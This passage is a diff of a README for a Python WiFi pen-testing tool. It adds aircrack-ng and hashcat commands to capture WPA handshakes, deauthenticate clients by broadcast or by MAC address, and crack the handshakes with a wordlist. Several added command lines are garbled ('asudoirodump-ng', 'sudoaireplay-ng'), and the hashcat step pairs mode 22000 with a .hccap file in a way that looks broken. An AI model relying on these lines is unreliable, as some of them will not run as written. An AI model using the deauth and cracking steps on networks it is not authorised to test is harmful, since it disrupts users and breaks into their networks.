@@ -9,7 +9,7 @@ Easy-to-use WiFI pen-testing/scanning tool written in python
 
 **Dependencies**
 ```c
-sudo apt install python3 ...
+sudo zypper in python3 aircrack-ng hashcat ...
 ```
 
 **Creating python virtual enviroment**
@@ -36,7 +36,7 @@ source venv/bin/activate
 
 Install python modules (prettytable, tqdm) 
 ```c
-pip install -r requirements.txt
+pip3 install -r requirements.txt
 ```
 
 Exit from virtual enviroment
@@ -73,48 +73,72 @@ sudo ./wifighter.py
 
 Set interface to monitor
 ```c
-airmon-ng start <INTERFACE>
+sudo airmon-ng start <INTERFACE>
 ```
 
 Set interface to managed
 ```c
-airmon-ng stop <INTERFACE>mon
+sudo airmon-ng stop <INTERFACE>mon
 ```
 
 **Scan nearby WiFi's**
 
 Scan all
 ```c
-airodump-ng <INTERFACE>mon
+sudo airodump-ng <INTERFACE>mon
 ```
 
 Scan 2.4GHz WiFi's
 ```c
-airodump-ng --band gb <ESSID> <INTERFACE>mon
+sudo airodump-ng --band gb <ESSID> <INTERFACE>mon
 ```
 
 Scan 5GHz WiFi's
 ```c
-airodump-ng --band a <ESSID> <INTERFACE>mon
+sudo airodump-ng --band a <ESSID> <INTERFACE>mon
 ```
+
+**Capture handshake**
 
 Listen for handshake of specified AP
 ```c
-airodump-ng -c <CHANNEL> -b <BSSID> -w OUTPUT_PATH <INTERFACE>mon
+asudoirodump-ng -c <CHANNEL> --bssid <BSSID> -w <OUTPUT_PATH> <INTERFACE>mon
 ```
 
 **Deauth clients (force handshake)**
 
 Deauth all (broadcast)
 ```c
-aireplay-ng -0 1 -a <BSSID> <INTERFACE>mon
+sudoaireplay-ng -0 1 -a <BSSID> <INTERFACE>mon
 ```
 
 Deauth client
 ```c
-aireplay-ng -0 1 -a <BSSID> -c <CLIENT_MAC> <INTERFACE>mon
+sudoaireplay-ng -0 1 -a <BSSID> -c <CLIENT_MAC> <INTERFACE>mon
 ```
 
+Verify captured handshake
+```c
+sudo aircrack-ng <HANDSHAKE>.cap 
+```
+
+**Crack handshake - aircrack**
+
+```c
+sudo aircrack-ng -w <WORDLIST> -b <TRAGET_AP_MAC> <HANDSHAKE>.cap
+```
+
+**Crack handshake - hashcat**
+
+Convert captured handshake to hashcat format
+```c
+sudo aircrack-ng -J <OUTPUTFILE> <HANDSHAKE>.cap  
+```
+
+Crack with wordlist
+```c
+sudo hashcat -m 22000 <HANDSHAKE>.hccap <WORDLIST>
+```
 
 
 ### 2. PMKID Attack (802.11r exploit)
